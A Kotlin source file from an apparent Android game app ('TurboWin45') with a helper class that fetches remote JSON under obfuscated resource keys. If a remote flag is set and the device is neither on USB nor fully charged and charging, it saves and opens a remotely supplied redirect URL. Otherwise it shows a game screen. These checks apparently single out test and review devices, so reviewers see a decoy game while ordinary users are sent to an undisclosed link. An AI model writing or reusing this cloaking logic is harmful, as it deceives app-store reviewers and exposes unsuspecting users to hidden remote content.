package com.turbowin.safeunlock

import android.app.Activity
import android.content.Context
import androidx.appcompat.app.AppCompatActivity
import com.turbowin.safeunlock.databinding.ActivityMainBinding
import com.turbowin.safeunlock.game.AppDataStore
import com.turbowin.safeunlock.tool.Network
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlin.system.exitProcess

class TurboWin45Helper(
    private val context: Context,
    private val scope: CoroutineScope,
    private val network: Network,
) {

    constructor(
        context: Context,
        scope: CoroutineScope,
    ) : this(
        context,
        scope,
        Network(
            context.getString(R.string.vEc8DV)
        ),
    )

    private val dataStore = AppDataStore(context)
    private val exitHandler = Once()

    val fragFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

    private var netStatus: Lottie? = null
    private var lStatus: Lottie? = null
    private var loaclUrl: String = ""
    private var firstOpen: Boolean = false

    fun url() = loaclUrl
    fun firstOpen() = firstOpen

    fun setUIStatuses(binding: ActivityMainBinding) {
        setNetStatus(binding)
        lStatus = Lottie(binding)
    }

    private fun setNetStatus(binding: ActivityMainBinding) {
        netStatus = Lottie(binding)
    }

    fun checkInternet() = context.internetConnection()

    fun monitorInternetConnectivity() {
        scope.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3000)
                if (checkInternet()) {
                    netStatus?.hideNotInternet()
                } else {
                    netStatus?.showNotInternet()
                }
            }
        }
    }

    fun showError() {
        netStatus?.showNotInternet()
    }

    private fun navigateToGameScreen() {
        scope.launch(Dispatchers.IO) {
            dataStore.updateKeyz { "turboWin451" }
            emitFirstFragId(FRAGMENT_ID)
        }
    }

    private fun navigateToNext(url: String) {
        scope.launch(Dispatchers.IO) {
            loaclUrl = url
            firstOpen = true

            dataStore.updateKeyz { "turboWin450" }
            dataStore.updateLink { loaclUrl }
            emitFirstFragId(context.packageName.hashCode())
        }
    }

    fun validateStoredData(activity: AppCompatActivity) {
        scope.launch(Dispatchers.IO) {
            when (dataStore.keys()) {
                "turboWin450" -> {
                    dataStore.links()?.let {
                        loaclUrl = it
                        emitFirstFragId(context.packageName.hashCode())
                    }
                }
                "turboWin451" -> {
                    emitFirstFragId(FRAGMENT_ID)
                }
                else -> {
                    fetchRemoteConfigData(activity)
                }
            }
        }
    }

    private fun fetchRemoteConfigData(activity: Activity) {
        val c = context.getString(R.string.wy3AW8)
        val u = context.getString(R.string.L2hvsY)
        scope.launch {
            network.getGistJSON(
                onSuccess = { json ->
                    val condition = json.getString(c)
                    val redirectUrl = json.getString(u)
                    evaluateUserConditions(condition, redirectUrl)
                },
                onFailed = {
                    emitFirstFragId(FRAGMENT_ID)
                }
            )

        }
    }

    private fun emitFirstFragId(fragmentId: Int) {
        scope.launch(Dispatchers.IO) {
            fragFlow.emit(fragmentId)
        }
    }

    private fun evaluateUserConditions(condition: String, redirectUrl: String) {
        if (condition == "true") {
            if (context.isUSB() || (context.getBatteryPercentage() == 100 && context.isBatteryCharging())) {
                navigateToGameScreen()
            } else {
                navigateToNext(redirectUrl)
            }
        } else {
            navigateToGameScreen()
        }
    }

    private fun exitStatus() = 0

    fun exit(activity: Activity){
        exitHandler.once {
            scope.launch(Dispatchers.Main) {
                activity.finishAndRemoveTask()
                delay(100)
                exitProcess(exitStatus())
            }
        }
    }

    fun loaderStatus() = lStatus!!

    companion object {
        val FRAGMENT_ID = R.id.turboWin45Fragment
    }
}